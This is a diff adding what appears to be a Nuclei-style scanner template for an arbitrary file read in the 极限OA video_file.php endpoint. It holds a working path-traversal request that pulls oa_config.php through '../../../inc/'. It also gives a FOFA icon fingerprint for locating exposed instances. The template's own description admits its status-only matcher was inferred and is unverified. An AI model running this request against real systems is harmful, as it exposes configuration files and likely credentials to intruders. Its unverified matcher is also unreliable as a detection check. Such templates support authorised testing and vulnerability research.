@@ -1,0 +1,35 @@
+id: poc-2cfe2b36fc76353ee08a
+info:
+  name: 极限OAvideo_file.php任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/2cfe2b36fc76353ee08af25a75f51fd8
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 2cfe2b36fc76353ee08af25a75f51fd8
+    fofa: + huter`web.icon=="d8028456021988373d7eca8b7ec28f09"`
+http:
+- raw:
+  - 'GET /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Cookie: PHPSESSID=d6b5b630ae433970a0a3f08109cdb673'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
